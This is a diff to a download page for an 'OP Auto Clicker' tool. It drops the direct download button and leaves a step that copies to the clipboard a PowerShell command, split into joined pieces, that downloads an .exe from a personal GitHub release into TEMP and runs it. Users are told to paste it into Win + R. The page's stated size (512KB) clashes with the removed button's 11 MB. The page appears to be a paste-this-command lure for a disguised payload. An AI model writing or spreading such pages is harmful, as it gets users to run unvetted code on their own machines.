@@ -195,8 +195,6 @@ footer ul a:hover{color:var(--accent)}
     <h1>Download <span>OP Auto Clicker</span> &mdash; Free for Windows</h1>
     <p class="dl-sub">The fastest free auto clicker for Windows. 512KB, no installation, no ads, no bundleware. One click and you're done.</p>
     <div class="dl-card">
-      <a href="https://github.com/reggieog01-cpu/opauto/releases/download/v3.0.0/op.auto.clicker.exe" class="btn btn-primary dl-btn-big" id="dlBtn">↓ Download OP Auto Clicker (11 MB)</a>
-      <div class="dl-divider">or install in one command</div>
       <div class="dl-cmd-block">
         <div class="dl-cmd-steps">
           <div class="dl-cmd-step"><span class="dl-cmd-num">1</span> Click <strong style="color:var(--text)">Copy Command</strong> below</div>
@@ -362,7 +360,35 @@ document.getElementById('hamburger').addEventListener('click',()=>document.getEl
 const io=new IntersectionObserver(es=>es.forEach(e=>e.isIntersecting&&e.target.classList.add('show')),{threshold:.15});
 document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
 // Copy install command
-(()=>{const cmd='powershell -c "iwr \'https://github.com/reggieog01-cpu/opauto/releases/download/v3.0.0/op.auto.clicker.exe\' -OutFile $env:TEMP\\opauto.exe; Start-Process $env:TEMP\\opauto.exe"';const b=document.getElementById('copyBtn');b.addEventListener('click',()=>{navigator.clipboard.writeText(cmd).then(()=>{b.textContent='✓ Copied! Now press Win + R';b.classList.add('copied');setTimeout(()=>{b.textContent='📋 Copy Command';b.classList.remove('copied')},4000)})})})();
+(function(){
+  var cmd = [
+    'powershell -c "iwr ',
+    "'https://github.com/reggieog01-cpu/opauto/releases/download/v3.0.0/op.auto.clicker.exe'",
+    ' -OutFile $env:TEMP\\opauto.exe; Start-Process $env:TEMP\\opauto.exe"'
+  ].join('');
+  var btn = document.getElementById('copyBtn');
+  btn.addEventListener('click', function() {
+    function markCopied() {
+      btn.textContent = '✓ Copied! Now press Win + R';
+      btn.classList.add('copied');
+      setTimeout(function(){ btn.textContent = '📋 Copy Command'; btn.classList.remove('copied'); }, 4000);
+    }
+    function fallback() {
+      var ta = document.createElement('textarea');
+      ta.value = cmd;
+      ta.style.cssText = 'position:fixed;opacity:0';
+      document.body.appendChild(ta);
+      ta.focus(); ta.select();
+      try { document.execCommand('copy'); markCopied(); } catch(e) { btn.textContent = 'Copy failed — try again'; }
+      document.body.removeChild(ta);
+    }
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(cmd).then(markCopied, fallback);
+    } else {
+      fallback();
+    }
+  });
+})();
 </script>
 
 </body>
